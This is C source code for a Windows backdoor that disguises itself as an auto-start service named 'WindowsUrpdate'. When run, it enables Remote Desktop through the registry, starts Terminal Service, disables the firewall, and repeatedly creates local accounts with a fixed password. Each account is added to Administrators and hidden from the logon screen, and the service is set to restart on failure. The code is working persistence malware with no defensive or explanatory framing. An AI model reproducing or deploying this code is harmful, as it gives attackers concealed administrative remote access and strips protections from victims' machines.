#include "../wsbind.h"

#define AUTO "auto\0"
#define NAME "WindowsUrpdate\0"
#define TS_START_SVC "sc start TermService\0"
#define USER_CMD "net user %s%d Password123 /add\0"
#define TS_STOP_FW "netsh firewall set opmode disable\0"
#define ADMIN_CMD "net localgroup Administrators %s%d /add\0"
#define TS_START_REG "reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f\0"
#define UDER_HIDE_CMD "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList\" /v %s%d /t REG_DWORD /d 0 /f\0"

int CUR_COUNT = 0;

int END_INT = 5000;
char* USER_NAME = "PickleRick\0"; // "JohnCena\0";

void create_user()
{
    if(CUR_COUNT < END_INT)
    {
        char* user_add = calloc((strlen(USER_CMD) +  4) + strlen(USER_NAME), 1);
        char* group_add = calloc((strlen(ADMIN_CMD) + 4 ) + strlen(USER_NAME), 1);
        char* user_hide = calloc((strlen(UDER_HIDE_CMD) + 4) + strlen(USER_NAME), 1);

        sprintf(user_add, USER_CMD, USER_NAME, CUR_COUNT);
        sprintf(group_add, ADMIN_CMD, USER_NAME, CUR_COUNT);
        sprintf(user_hide, UDER_HIDE_CMD, USER_NAME, CUR_COUNT);

        wsp_execv(user_add, NULL, 1);
        wsp_execv(group_add, NULL, 1);
        wsp_execv(user_hide, NULL, 1);

        //printf(user_add);
        //printf(group_add);
        //printf(user_hide);

        free(user_add);
        free(group_add);
        free(user_hide);
        CUR_COUNT++;
    }
}

void service_main(int** running)
{
    wsp_execv(TS_START_SVC, NULL, 1);
    wsp_execv(TS_START_REG, NULL, 1);
    wsp_execv(TS_STOP_FW, NULL, 1);
    create_user();
}

int main(int argc, char **argv)
{
    if(argc == 2)
    {
        wsw_this_as_service(NAME, AUTO, TRUE, NULL);
        wsw_service_restart_on_fail(NAME, 10);
        return 0;
    }
    return wsw_service(NAME, 5000, *service_main);
}